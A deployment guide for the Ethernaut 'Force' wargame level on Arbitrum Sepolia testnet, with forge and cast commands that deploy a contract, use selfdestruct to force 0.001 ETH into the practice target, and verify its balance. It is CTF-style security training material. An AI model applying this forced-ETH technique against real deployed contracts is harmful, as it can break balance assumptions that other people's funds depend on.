# Testnet Deployment Guide: Force Exploit (Arbitrum Sepolia)

**Level:** Ethernaut 07 — Force  
**Network:** Arbitrum Sepolia  
**Goal:** Deploy exploit and validate selfdestruct ETH transfer  
**Estimated Cost:** <$0.01 (Sepolia ETH)

---

## Prerequisites

```bash
# Environment variables needed
export ARBITRUM_SEPOLIA_RPC="https://sepolia-rollup.arbitrum.io/rpc"
export PRIVATE_KEY="0x..."  # Test wallet private key
export FORCE_TARGET="0x..."  # Target contract on Arbitrum Sepolia
```

**Get Sepolia ETH:**
- Arbitrum Sepolia faucet: https://faucet.quicknode.com/arbitrum/sepolia
- Or bridge from Ethereum Sepolia: https://bridge.arbitrum.io

---

## Deployment Steps

### 1. Deploy ForceAttack Contract

```bash
cd ethernaut

# Set environment
export FORCE_TARGET="0xYourTargetAddressHere"

# Deploy
forge script script/Force.s.sol:DeployForceAttack \
  --rpc-url $ARBITRUM_SEPOLIA_RPC \
  --private-key $PRIVATE_KEY \
  --broadcast \
  --verify
```

**Expected output:**
```
ForceAttack deployed at: 0x...
Target: 0x...
```

Save the `ForceAttack` address — you'll need it for execution.

---

### 2. Execute the Attack

```bash
# Set environment
export FORCE_ATTACK="0xYourDeployedAttackAddress"
export ATTACK_AMOUNT="1000000000000000"  # 0.001 ETH in wei

# Execute
forge script script/Force.s.sol:ExecuteForceAttack \
  --rpc-url $ARBITRUM_SEPOLIA_RPC \
  --private-key $PRIVATE_KEY \
  --broadcast \
  --value $ATTACK_AMOUNT
```

**What happens:**
1. `attack()` receives 0.001 ETH
2. Deploys `ForceExploit` with the ETH
3. Calls `selfdestruct(target)` 
4. Target balance increases by 0.001 ETH

---

### 3. Verify Success

```bash
# Check target balance
cast balance $FORCE_TARGET --rpc-url $ARBITRUM_SEPOLIA_RPC

# Expected: 1000000000000000 (or whatever amount you sent)
```

**Alternative — Etherscan:**
- View target: https://sepolia.arbiscan.io/address/0x...
- Check "Balance" field

---

## Transaction Flow

```
User → ForceAttack.attack{value: 0.001 ETH}()
    → Deploy ForceExploit{value: 0.001 ETH}
    → ForceExploit.selfdestruct(target)
        → target receives 0.001 ETH (forced)
```

---

## Key Observations

1. **No code execution on target** — `selfdestruct` doesn't call any functions
2. **Atomic transfer** — Happens in single transaction
3. **Irreversible** — Can't undo the balance change
4. **Gas efficient** — Cheaper than normal transfer (no call overhead)

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| "insufficient funds" | Get more Sepolia ETH from faucet |
| "nonce too low" | Wait for pending tx or manually set nonce |
| "contract not verified" | Verification is optional on testnet |
| "call failed" | Check target address is correct |

---

## Next Steps

- [ ] Record transaction hash
- [ ] Screenshot Arbiscan balance
- [ ] Document gas costs
- [ ] Repeat with 24 other exploits
- [ ] Compile "Arbitrum Sepolia Security Validation" report

---

**Status:** 📝 Guide complete — Ready for execution  
**Blocker:** Need Arbitrum Sepolia ETH + target contract address  
**Priority:** HIGH (Week 2 core goal)
